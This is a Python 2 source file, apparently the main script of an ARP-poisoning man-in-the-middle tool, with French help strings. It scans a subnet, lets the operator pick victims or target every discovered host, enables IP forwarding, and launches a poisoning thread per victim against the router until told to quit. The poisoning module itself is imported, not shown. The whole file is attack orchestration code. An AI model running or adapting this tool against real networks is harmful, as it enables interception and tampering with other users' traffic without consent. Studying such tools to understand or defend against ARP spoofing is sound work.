from arpPoisoning import *
from ipScanner import IpScanner
from subprocess import Popen
from os import geteuid
from time import sleep
import argparse
import sys

def main():
    #argument parsing
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--scan", help= "Par default scan sur 192.168.0", default="192.168.0")
    parser.add_argument("-i", "--interactive", help= "Par default n'est pas interactif", action="store_true")
    parser.add_argument("-r", "--routerIP", help="Choisisez le IP du routeur", default="192.168.0.1")
    parser.add_argument("-m", "--myIp", help="Obligatoire pour specifier son addresse ip")
    args = parser.parse_args()

    if geteuid() != 0:
        sys.exit("[!] Please run as root")

    interactive = args.interactive
    routerIP = args.routerIP
    myIp = args.myIp
    scanner = IpScanner(args.scan)
    targetlist = scanner.scan()

    try:
        targetlist.remove(routerIP)
    except:
        pass
    try:
        targetlist.remove(myIp)
    except:
        pass

    attacklist = []

    #who to target?
    if interactive:
        while True:
            if targetlist == []:
                print 'Target list empty'
                break

            print 'Get the os for the specified IP addresse, write "next" to go to next step.'
            print targetlist
            ip = raw_input()
            if ip == 'next':
                break
            else:
                attackOS = scanner.getOsForIp(ip)
                print attackOS

            print 'Do you want to add this to the attack list? (y/n)'
            answer = raw_input()
            if answer == 'y' or answer =='yes':
                attacklist.append(ip)
                targetlist.remove(ip)

    else:
        attacklist = targetlist
        #interaction avec usager pour les targets

    print attacklist

    initIpFwd()
    print "exit flag: ", exitFlag
    threadList = []
    for i in attacklist:
        t = ArpPoison(routerIP, i)
        print "Starting thread: ",t.getName()
        t.start()
        threadList.append(t)


    while True:
        answer = raw_input()
        if answer == 'quit':
            break
        sleep(1)

    ArpPoison.exitFlag = 1
    for t in threadList:
        print "Sopping: ", t.getName()
        t.join()
    restoreIpFwd()


def initIpFwd():
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('1\n')


def restoreIpFwd():
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('0\n')


if __name__ == "__main__":
    main()